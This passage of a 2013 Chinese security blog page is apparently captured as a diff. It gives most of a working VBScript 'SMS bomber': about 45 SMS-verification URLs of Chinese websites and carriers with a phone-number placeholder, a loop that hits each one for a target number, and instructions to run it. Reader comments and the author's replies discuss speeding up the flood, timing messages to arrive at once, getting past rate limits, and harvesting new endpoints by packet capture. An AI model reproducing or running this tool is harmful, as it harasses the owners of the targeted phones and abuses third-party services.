+            "http://u.baidu.com/?module=default&amp;controller=Reg&amp;action=sendSMS&amp;b1350745948890=1&amp;mobile=%phone_number%&amp;appid=3&amp;ucname=huisexinxi", _
+            "http://as.baidu.com/a/msg?act=sendtomobile&amp;f=topic_3001_2_0&amp;mobile=%phone_number%&amp;docid=1439803&amp;ctime=1353852949890", _
+            "http://as.baidu.com/a/msg?act=sendtomobile&amp;f=web_alad_6%40next%40software_1003_6&amp;mobile=%phone_number%&amp;docid=1346020&amp;ctime=1350747592671", _
+            "http://api.pengyou.com/json.php?mod=mobilebind&amp;act=sendsms&amp;mobile=%phone_number%&amp;g_tk=null", _
+            "http://www.maiduo.com/handler/Register/Register.ashx?act=check&amp;mobile=%phone_number%&amp;checkCode=undefined", _
+            "http://www.sinosig.com/auth/regist_resetMsg.action?sso_userName=%phone_number%&amp;isAjaxSubmit=true", _
+            "http://www.pubyun.com/accounts/signup_vcode/4449056/?mobile=%phone_number%", _
+            "http://dealer.autohome.com.cn/Handler/SendMessage.ashx?action=sendcode&amp;mob=%phone_number%", _
+            "http://yuyue.shdc.org.cn/User/ajaxSendConfirmCode.aspx?mobile=%phone_number%", _
+            "http://reg.ztgame.com/registe/mobilePhoneRegister?type=isBindPhoneNum&amp;phoneNum=%phone_number%", _
+            "http://www.baixing.com/ajax/auth/sendCode/?type=resetPassword&amp;mobile=%phone_number%", _
+            "http://mail.sina.com.cn/cgi-bin/phonecode.php?phonenumber=%phone_number%", _
+            "http://passport.q.com.cn/register/index/ajaxcheckmobile/?mobile=%phone_number%", _
+            "http://yun.baidu.com/account/v1/api/sendacodenormal?dest=%phone_number%", _
+            "https://reg.passport.the9.com/api/chk_loginname?loginname=%phone_number%&amp;accounttype=reg_mobile", _
+            "https://login.sina.com.cn/signup/check_user.php?format=json&amp;from=mobile&amp;name=%phone_number%", _
+            "http://js.ac.10086.cn/jsauth/reg?method=sendVerCode&amp;=%phone_number%", _
+            "http://my.xoyo.com/register/isExist/0.8101254514227967?uid=%phone_number%&amp;type=mobile", _
+            "http://member.changyou.com/register/checkPhoneIsUsed.do?securityPhone=%phone_number%", _
+            "https://reg.91.com/AjaxAction/AC_register.ashx?action=verifyusernameofmobile&amp;txtUserNameOfMobile=%phone_number%", _
+            "http://211.136.93.21/hfwebbusi/pay/saveOrder.do?mobileId=%phone_number%", _
+            "http://passport.wanmei.com/NoteAction.do?method=sendRegCode?mobile=%phone_number%", _
+            "http://authleqr.sdo.com/lars/check-account-types.jsonp?callback=jQuery16203658856788579764_1366925187811&amp;userId=%phone_number%&amp;_=1366925195670", _
+            "http://www.guahao.com/validcode/json/mobile/%phone_number%/REG_MOBILE/cebaf071614ac29f9ad6c692b474a46f?_=1366925898545", _
+            "http://chinatelecom.zc.qq.com/cgi-bin/send_sms?phonenum=%phone_number%&amp;stype=1", _
+            "http://cas.sdo.com/authen/sendPhoneCheckCode.jsonp?callback=sendPhoneCheckCode_JSONPMethod&amp;inputUserId=%phone_number%&amp;type=3&amp;appId=201&amp;areaId=0&amp;serviceUrl=", _
+            "http://sdo.com&amp;productVersion=v5&amp;frameType=3&amp;locale=zh_CN&amp;version=21&amp;tag=20&amp;authenSource=2&amp;productId=2&amp;_=1366924349498", _
+            "http://www.1732.com/public/ajax.aspx?app=resendcode&amp;bindaccount=%phone_number%", _
+            "http://sign.kting.cn/register/getphoneverify/phone/%phone_number%", _
+            "http://m.xs8.cn/user/quick_signup.html?mobile=%phone_number%", _
+            "http://bbs.360che.com/ajax1.php?action=ds21&amp;mobilenum=%phone_number%&amp;inajax=1&amp;ajaxtarget=ts", _
+            "http://pass.ledu.com/reg/mobilecode?type=reg&amp;mobile=%phone_number%&amp;r=0.7577109599155907", _
+            "http://www.52callme.com/Handler/SendVerifyCodeHandler.ashx?m=%phone_number%", _
+            "http://sso.letv.com/user/mobileRegCode/mobile/%phone_number%/mobilecodeletvid/c326961366927138", _
+            "http://www.sinosig.com/auth/regist_refresh.action?sso_userName=%phone_number%&amp;resetSend=1", _
+            "https://sn.ac.10086.cn/sendMsgRequest?mobileNumber=%phone_number%", _
+            "https://fj.ac.10086.cn/SMSCodeSend?mobileNum=%phone_number%&amp;validCode=0000&amp;errorurl=https://fj.ac.10086.cn/4login/errorPage.jsp&amp;name=menhu", _
+            "https://fj.ac.10086.cn/SMSCodeSend?mobileNum=%phone_number%&amp;validCode=0000&amp;errorurl=http://www.fj.10086.cn:80/service/login/send.jsp", _
+            "https://fj.ac.10086.cn/ssouser/sendMessage.do?mobileno=%phone_number%", _
+            "http://www.gs.10086.cn/gs_obsh_service/actionDispatcher.do?userMobile=%phone_number%", _
+            "https://sn.ac.10086.cn/sendMsgRequest?code=%E7%82%B9%E5%87%BB%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81&amp;mobileNumber=%phone_number%", _
+            "https://js.ac.10086.cn/jsauth/dzqd/pagSendDypass?umobile=%phone_number%", _
+            "http://gd.10086.cn/ngcrm/hall/SendRandomSms.action?mobile=%phone_number%&amp;isReRequest=false", _
+            "http://liao.189.cn/ECP-Portals/phoneDown/download.do?phone=%phone_number%", _
+            "https://ecplive.cn/reg/servlet/ivrInvokeServlet?number=%phone_number%&amp;flagNum=3")
+
+x = "13888888888"
+
+on error resume next
+
+for i = Lbound(api) To Ubound(api)
+    echo geturl(replace(api(i), "%phone_number%", x))
+next</pre>
+<p style="text-indent:2em;">
+	用法相当简单，先保存为“phone_bomb.vbs”，然后 cmd 下执行： cscript phone_bomb.vbs
+</p>
+<p style="text-indent:2em;">
+	<span style="color:#E53333;"><strong>以上代码仅作技术研究用！请勿用作任何非法用途！否则后果自负！</strong></span> 
+</p>
+<p><strong>留言评论（旧系统）：</strong></p>
+<div style="max-height:600px;width:100%;overflow:auto;overflow-x:hidden;">
+<blockquote id="4900,3860,110.86.27.194">
+<p>shi_y @ 2013-09-12 11:03:49</p>
+<p style="text-indent:2em">测试了一下，小部分已提示404.不过总体是不错的。。。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">嗯，接口可以自己更新一下嘛……</p>
+</blockquote>
+<blockquote id="4901,3860,113.140.6.143">
+<p>change @ 2013-09-12 11:19:13</p>
+<p style="text-indent:2em">测试了一下，感觉发送间隔有点大。
+我觉得可以先统计一下每个接口发出请求到目标号码接收到短信的延迟时间。然后以各接口的延迟差为间隔按延迟从大到小向各接口发送请求。这样应该能让被攻击者同时收到大量短信——就是不知道各电信运营商是怎么处理某一号码同时收到大量下行短信的情况的。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">这是 vbs 脚本，单线程执行的，所以有点慢，你可以改成多线程的程序，或者同时多开几个，再筛选一下接口质量，去掉无效的，应该不错了。</p>
+</blockquote>
+<blockquote id="4902,3860,118.253.97.17">
+<p>佚名 @ 2013-09-12 12:08:39</p>
+<p style="text-indent:2em">不错,顺便请教下如何找这些接口?
+还有博主的代码高亮貌似有点小问题,geturl函数结尾那里能看出来</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">找接口很简单啊，百度搜：注册账号 手机验证码，一堆注册站，尤其是电商网站基本都要求手机号码注册，然后抓个包就行了。
+本站编辑器用的“KindEditor”，官方代码高亮插件用的是 google code prettify，这玩意儿语法判断不太准，很早我就在官网建议过，但一直也没换……
+http://www.kindsoft.net/view.php?bbsid=4&amp;postid=4576&amp;pagenum=1
+http://lcx.cc/?i=2200</p>
+</blockquote>
+<blockquote id="4905,3860,117.40.6.173">
+<p>佚名 @ 2013-09-12 17:01:18</p>
+<p style="text-indent:2em">很好奇，这些都是手工收集的吗？
+还有个问题，最近这几天网站经常打不开。不知道是不是被我们这电信给墙了</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">我提取别人的接口，应该是手工收集的，这种东西工具根本无法采集。
+前两天打不开，是因为cdn问题，换了一个。</p>
+</blockquote>
+<blockquote id="4908,3860,14.204.66.194">
+<p>佚名 @ 2013-09-12 18:34:45</p>
+<p style="text-indent:2em">最近类似的洞洞很多啊！都是些直接调用，要么改改包就能用的。估计过段时间慢慢就少了。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">嗯，估计会加一下限制之类的，例如同一个号码每天发送次数，Cookie 验证之类的，不过，量大，这些都不是问题……</p>
+</blockquote>
+<blockquote id="4913,3860,60.247.124.66">
+<p>路人 @ 2013-09-13 17:16:17</p>
+<p style="text-indent:2em">核总你这才发布一天，今天就看到好几个别人贴出来短信轰炸的网站了……</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">我勒个去……</p>
+</blockquote>
+<blockquote id="4914,3860,27.26.139.108">
+<p>佚名 @ 2013-09-13 20:38:33</p>
+<p style="text-indent:2em">不停的弹窗怎么办</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">弹窗？弹什么窗？</p>
+</blockquote>
+<blockquote id="5052,3860,223.152.82.111">
+<p>路过的 @ 2013-10-05 22:01:02</p>
+<p style="text-indent:2em">有关一楼的那个问题我也遇到了。
+就是执行vbs之后，不断地弹出Windows Script Host的弹窗出来，内容很简短：status=×   size=×，只有一个选项可以选择，就是“确定”，不知道怎么让它不再弹出来。我打算现在试试重新启动，但是，是否有不重启就可以让它不再弹的办法呢？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">看来你没有搞清楚如何执行vbs，这是在控制台下执行的，如果你直接双击的话，本来在控制台下输出的信息，会变成对话框弹出来，自然会出现很多对话框，文章末尾已经提到了具体执行方法。还有，这跟重启有个鸡毛关系……</p>
+</blockquote>
+<blockquote id="5056,3860,223.152.82.111">
+<p>路过的 @ 2013-10-06 19:00:09</p>
+<p style="text-indent:2em">看来你没有搞清楚如何执行vbs，这是在控制台下执行的，如果你直接双击的话，本来在控制台下输出的信息，会变成对话框弹出来，自然会出现很多对话框，文章末尾已经提到了具体执行方法。还有，这跟重启有个鸡毛关系……//
+sorry，不是学计算机的，对着方面的东西确实不懂。双击执行vbs是因为记得以前弄过一个vbs的文件，直接双击执行的，那时没有出现问题。当然两者运行的东西不同也许也会导致这种情况，但是确实没考虑到。还有，我也不知道重启是否能够让弹窗不再弹出，但是小白不是有句老话么——重启基本能解决所有问题。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">好吧……</p>
+</blockquote>
+<blockquote id="5061,3860,120.43.163.148">
+<p>佚名 @ 2013-10-07 11:28:32</p>
+<p style="text-indent:2em">可以来个循环</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">尽情的DIY吧</p>
+</blockquote>
+<blockquote id="5151,3860,122.224.254.36">
+<p>佚名 @ 2013-10-19 19:53:03</p>
+<p style="text-indent:2em">请在这里填写留言内容，最长不超过 1000 字。</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">[暂无回复]</p>
+</blockquote>
+<blockquote id="5473,3860,1.60.71.209">
+<p>seo @ 2013-12-14 15:10:04</p>
+<p style="text-indent:2em">求大牛写一份  python 的  最好 POST GET的都有  谢谢了。  等待大牛答案哦。 411161555@qq.com</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">伸手党一律砍手！</p>
+</blockquote>
+<blockquote id="5474,3860,1.60.71.209">
+<p>seo @ 2013-12-14 15:44:24</p>
+<p style="text-indent:2em">求大牛写一份  python 的  最好 POST GET的都有  谢谢了。  等待大牛答案哦。 411161555@qq.com</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">伸手党一律砍手！</p>
+</blockquote>
+<blockquote id="5576,3860,183.234.60.172">
+<p>waterfox @ 2013-12-30 14:15:29</p>
+<p style="text-indent:2em">伸手党可耻！
+vbs脚本可以用，网站也懒得找了，找时间DIY一下
+（提醒，浏览器复制黏贴时部分代码可能有纰漏，按照原文修改一下就好了）</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">╮(╯_╰)╭</p>
+</blockquote>
+<blockquote id="7540,3860,223.73.14.37">
+<p>佚名 @ 2015-04-15 11:51:39</p>
+<p style="text-indent:2em">在么  请问为什么显示编译器错误，语句未结束</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">第几行？详细报错是？</p>
+</blockquote>
+<blockquote id="8247,3860,58.56.200.238">
+<p>佚名 @ 2016-05-06 11:39:40</p>
+<p style="text-indent:2em">大神，http://lcx.cc/?i=3860的这篇文章，短信炸弹，短信轰炸，利用各大网站的验证码功能批量轰炸某个号码，  你是用什么方法得到手机号的传输地址的？是通过抓取数据包，还是从网页js文件中找的，还是通过爬虫抓取的？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">每个网站都不一样，全靠经验，抓包、看源码、读js等……</p>
+</blockquote>
+<blockquote id="8248,3860,58.56.200.238">
+<p>佚名 @ 2016-05-06 13:16:42</p>
+<p style="text-indent:2em">如果通过抓包的话，抓取的数据是不是加密过的？</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">纯http协议，基本都是明文的，这个简单的功能也没必要加密，可能有少数的会有验证码或登录验证之类的，并不是每个接口都可以用，看具体情况。</p>
+</blockquote>
+<blockquote id="8249,3860,58.56.200.238">
+<p>佚名 @ 2016-05-06 13:18:27</p>
+<p style="text-indent:2em">大神，能能用qq单聊，我1608336017</p>
+<p>本站回复：</p>
+<p style="text-indent:2em">唯一QQ：Nuclear&#39;Atk  root@lcx.cc(624118310)</p>
+</blockquote>
+</div>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2013-09-12
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/%E7%9F%AD%E4%BF%A1/">短信</a>
+          <a href="https://lcx.cc/tags/%E5%8F%B7%E7%A0%81/">号码</a>
+          <a href="https://lcx.cc/tags/%E6%89%B9%E9%87%8F/">批量</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%AB%99/">网站</a>
+          <a href="https://lcx.cc/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/">验证码</a>
+          <a href="https://lcx.cc/tags/360/">360</a>
+          <a href="https://lcx.cc/tags/api/">API</a>
+          <a href="https://lcx.cc/tags/app/">app</a>
+          <a href="https://lcx.cc/tags/asp/">ASP</a>
+          <a href="https://lcx.cc/tags/cgi/">CGI</a>
+          <a href="https://lcx.cc/tags/cia/">CIA</a>
+          <a href="https://lcx.cc/tags/cmd/">Cmd</a>
+          <a href="https://lcx.cc/tags/html/">Html</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/js/">js</a>
+          <a href="https://lcx.cc/tags/json/">JSON</a>
+          <a href="https://lcx.cc/tags/jsp/">Jsp</a>
+          <a href="https://lcx.cc/tags/nds/">NDS</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/qq/">QQ</a>
+          <a href="https://lcx.cc/tags/rat/">Rat</a>
+          <a href="https://lcx.cc/tags/url/">URL</a>
+          <a href="https://lcx.cc/tags/vb/">VB</a>
+          <a href="https://lcx.cc/tags/vbs/">VBS</a>
+          <a href="https://lcx.cc/tags/web/">Web</a>
+          <a href="https://lcx.cc/tags/%E6%89%8B%E6%9C%BA/">手机</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/3861/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">注意，日站的时候请清理cookie或使用虚拟机，否则可被cookie追踪</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/3859/">
+            <span class="next-text nav-default">《如梦》</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
